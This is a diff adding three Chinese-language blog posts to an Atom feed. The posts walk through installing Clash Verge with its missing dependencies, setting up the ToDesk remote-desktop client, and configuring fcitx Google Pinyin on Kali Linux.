+    <content type="html"><![CDATA[<p>环境: Kali Linux 2024.3 amd64</p><p>Clash Verge 项目地址：<a href="https://github.com/clash-verge-rev/clash-verge-rev">clash-verge-rev&#x2F;clash-verge-rev: Continuation of Clash Verge - A Clash Meta GUI based on Tauri (Windows, MacOS, Linux)</a></p><p>安装包地址：<a href="https://github.com/clash-verge-rev/clash-verge-rev/releases">Releases · clash-verge-rev&#x2F;clash-verge-rev</a></p><p>节点转换工具：<a href="https://v2rayse.com/node-convert">V2Ray节点转换工具 | 免费VPN节点分享与管理平台</a></p><p>另一个代理工具nekoray：<a href="https://github.com/Matsuridayo/nekoray/releases">Releases · MatsuriDayo&#x2F;nekoray</a></p><p>使用dpkg安装clash-verge报错如下,缺少libwebkit2gtk-4.0-37依赖</p><p><img src="/img/clashverge/1.webp" alt="请添加图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Unsatisfied dependencies:</span><br><span class="line"> libjavascriptcoregtk-4.0-18 : Depends: libicu74 (&gt;= 74.1-1~) but it is not installable</span><br><span class="line"> libwebkit2gtk-4.0-37 : Depends: libicu74 (&gt;= 74.1-1~) but it is not installable</span><br><span class="line">                        Depends: libjpeg8 (&gt;= 8c) but it is not installable</span><br></pre></td></tr></table></figure><p>参考官网<a href="https://www.clashverge.dev/faq/linux.html#ubuntu-2404">Ubuntu 24.04 版本无法正常安装</a></p><p>使用wget拉取<a href="https://github.com/clash-verge-rev/clash-verge-rev/releases/download/dependencies/libwebkit2gtk-4.0-37_2.43.3-1_amd64.deb">libwebkit2gtk-4.0-37_2.43.3-1_amd64.deb</a>和<a href="https://github.com/clash-verge-rev/clash-verge-rev/releases/download/dependencies/libjavascriptcoregtk-4.0-18_2.43.3-1_amd64.deb">libjavascriptcoregtk-4.0-18_2.43.3-1_amd64.deb</a></p><p>再使用apt安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install ./libwebkit2gtk-4.0-37_2.43.3-1_amd64.deb ./libjavascriptcoregtk-4.0-18_2.43.3-1_amd64.deb</span><br></pre></td></tr></table></figure><p>报错如下,缺少libicu74和libjpeg8</p><p><img src="/img/clashverge/2.webp" alt="请添加图片描述"></p><p>参考<a href="https://www.reddit.com/r/linux4noobs/comments/1adnavi/libjpeg8_is_not_installable/">libjpeg8 is not installable</a>和 <a href="https://pkg.kali.org/pkg/libjpeg8">https://pkg.kali.org/pkg/libjpeg8</a> , kali源的libjpeg8支持似乎已被移除</p><p>于是通过 <a href="https://ubuntu.pkgs.org/">https://ubuntu.pkgs.org/</a> 搜索并下载相关依赖(libjpeg8依赖libjpeg-turbo8), wget拉取后使用apt安装即可</p><p>下载链接如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://archive.ubuntu.com/ubuntu/pool/main/libj/libjpeg-turbo/libjpeg-turbo8_2.0.3-0ubuntu1_amd64.deb</span><br><span class="line">http://archive.ubuntu.com/ubuntu/pool/main/libj/libjpeg8-empty/libjpeg8_8c-2ubuntu8_amd64.deb</span><br><span class="line">http://archive.ubuntu.com/ubuntu/pool/main/i/icu/libicu74_74.2-1ubuntu3_amd64.deb</span><br></pre></td></tr></table></figure><p>综上所述,安装顺序如下:</p><ol><li>wget拉取,apt安装libjpeg-turbo8, libjpeg8_8c, libicu74</li><li>wget拉取,apt安装libwebkit2gtk和libjavascriptcoregtk</li><li>dpkg安装clash-verge</li></ol><p><img src="/img/clashverge/3.webp" alt="请添加图片描述"></p>]]></content>
+    
+    
+    <summary type="html">kali,os,hack</summary>
+    
+    
+    
+    <category term="proxy" scheme="https://macin.top/categories/proxy/"/>
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="clash" scheme="https://macin.top/categories/proxy/clash/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    
+    <category term="proxy" scheme="https://macin.top/tags/proxy/"/>
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="hack" scheme="https://macin.top/tags/hack/"/>
+    
+    <category term="clash" scheme="https://macin.top/tags/clash/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>kali安装远程控制桌面todesk</title>
+    <link href="https://macin.top/posts/ee11d60/"/>
+    <id>https://macin.top/posts/ee11d60/</id>
+    <published>2024-12-11T14:17:16.000Z</published>
+    <updated>2024-12-19T15:25:35.224Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="Debian-Ubuntu-Mint"><a href="#Debian-Ubuntu-Mint" class="headerlink" title="Debian&#x2F;Ubuntu&#x2F;Mint"></a>Debian&#x2F;Ubuntu&#x2F;Mint</h3><p>deb package:<a href="https://dl.todesk.com/linux/todesk-v4.7.2.0-amd64.deb">https://dl.todesk.com/linux/todesk-v4.7.2.0-amd64.deb</a></p><p>立即下载</p><p>（使用4.7.2.0覆盖安装后，临时密码将会变更）</p><h4 id="安装命令："><a href="#安装命令：" class="headerlink" title="安装命令："></a>安装命令：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ./todesk-v4.7.2.0-amd64.deb</span><br></pre></td></tr></table></figure><h4 id="启动命令："><a href="#启动命令：" class="headerlink" title="启动命令："></a>启动命令：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">todesk</span><br></pre></td></tr></table></figure><h4 id="如不能正常使用-请执行以下命令初始化"><a href="#如不能正常使用-请执行以下命令初始化" class="headerlink" title="如不能正常使用,请执行以下命令初始化."></a>如不能正常使用,请执行以下命令初始化.</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop todeskd.service</span><br><span class="line">sudo <span class="built_in">mv</span> /opt/todesk/config/config.ini /opt/todesk/config/config.ini.bak</span><br><span class="line">sudo systemctl start todeskd.service</span><br></pre></td></tr></table></figure><h4 id="排查错误可执行以下命令看日志"><a href="#排查错误可执行以下命令看日志" class="headerlink" title="排查错误可执行以下命令看日志:"></a>排查错误可执行以下命令看日志:</h4><h4 id="查看服务日志：（例如-xxxx-xx-xx-log为2022-08-03-log）"><a href="#查看服务日志：（例如-xxxx-xx-xx-log为2022-08-03-log）" class="headerlink" title="查看服务日志：（例如:xxxx_xx_xx.log为2022_08_03.log）"></a>查看服务日志：（例如:xxxx_xx_xx.log为2022_08_03.log）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tail</span> -f /var/log/todesk/service_xxxx_xx_xx.log</span><br></pre></td></tr></table></figure><h4 id="查看客户端日志：（例如-xxxx-xx-xx-log为2022-08-03-log）"><a href="#查看客户端日志：（例如-xxxx-xx-xx-log为2022-08-03-log）" class="headerlink" title="查看客户端日志：（例如:xxxx_xx_xx.log为2022_08_03.log）"></a>查看客户端日志：（例如:xxxx_xx_xx.log为2022_08_03.log）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tail</span> -f ~/.local/share/todesk/Logs/client_xxxx_xx_xx.log</span><br></pre></td></tr></table></figure><h4 id="删除服务设置配置"><a href="#删除服务设置配置" class="headerlink" title="删除服务设置配置:"></a>删除服务设置配置:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">rm</span> /opt/todesk/config/config.ini</span><br></pre></td></tr></table></figure><h4 id="卸载"><a href="#卸载" class="headerlink" title="卸载:"></a>卸载:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove --purge todesk</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">kali,os,hack</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    <category term="hack" scheme="https://macin.top/categories/hack/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="hack" scheme="https://macin.top/tags/hack/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>kali安装中文输入法谷歌拼音google pinying</title>
+    <link href="https://macin.top/posts/4f1e28f3/"/>
+    <id>https://macin.top/posts/4f1e28f3/</id>
+    <published>2024-12-11T14:07:01.000Z</published>
+    <updated>2024-12-19T15:25:35.223Z</updated>
+    
+    <content type="html"><![CDATA[<p>如果你是刚安装完系统，建议先去更新自己kali源，以下内容全部是基于kali源更新执行进行的。<br>很多新手朋友安装kali以后想使用中文输入法，但是奈何怎么折腾也弄不出来，今天正好需要安装kali就简单做一个记录，希望对你有所帮助，还请路过大牛指出不足！</p><h2 id="1-sudo-su"><a href="#1-sudo-su" class="headerlink" title="1.sudo su"></a>1.sudo su</h2><p><img src="/img/fcitx/1.webp" alt="img"></p><h2 id="2-更新源"><a href="#2-更新源" class="headerlink" title="2.更新源"></a>2.更新源</h2><p>输入命令 vi &#x2F;etc&#x2F;apt&#x2F;sources.list</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#中科大</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src shttp://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><h2 id="3-更新软件源和软件"><a href="#3-更新软件源和软件" class="headerlink" title="3.更新软件源和软件"></a>3.更新软件源和软件</h2><p>输入命令 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get upgrade</span><br></pre></td></tr></table></figure><p>输入命令 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get upgrade &amp;&amp; sudo apt-get clean</span><br></pre></td></tr></table></figure><p>注释：<br>apt-get update 用于同步远程仓库中的软件列表，以便让 apt-get 知道软件的最新状态，是否可更新。<br>apt-get upgrade 用于更新所有已经在系统安装的软件，如果更新软件需要更改其它软件的状态，如需要降级，则不更新软件。</p><p><strong>1、 安装输入法输入法框架</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install fcitx</span><br></pre></td></tr></table></figure><p><strong>2、 下载好以后，程序中会多出下面两个图标</strong><br><img src="/img/fcitx/2.webp" alt="在这里插入图片描述"><br><strong>3、 现在安装一个中文输入法google输入法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install fcitx-googlepinyin</span><br><span class="line">reboot      <span class="comment">#重启系统</span></span><br></pre></td></tr></table></figure><p><strong>4、 点击fcitx配置，可以看到Google拼音，如果没有点击左下角的+进行搜索</strong><br><img src="/img/fcitx/3.webp" alt="在这里插入图片描述"><br><strong>5、 如果出现多种输入法，将Google添加到第一位作为默认输入法，点击下方的上下箭头可以调整</strong><br><img src="/img/fcitx/4.webp" alt="在这里插入图片描述"><br><strong>6、 点击全局配置即可进行进行快捷键等功能配置</strong><br><img src="/img/fcitx/5.webp" alt="在这里插入图片描述"><br><strong>7、 测试结果</strong><br><img src="/img/fcitx/6.webp" alt="在这里插入图片描述"></p>]]></content>
+    
+    
+    <summary type="html">kali,os,hack</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    <category term="hack" scheme="https://macin.top/categories/hack/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="hack" scheme="https://macin.top/tags/hack/"/>
+    
+  </entry>
+  
+</feed>
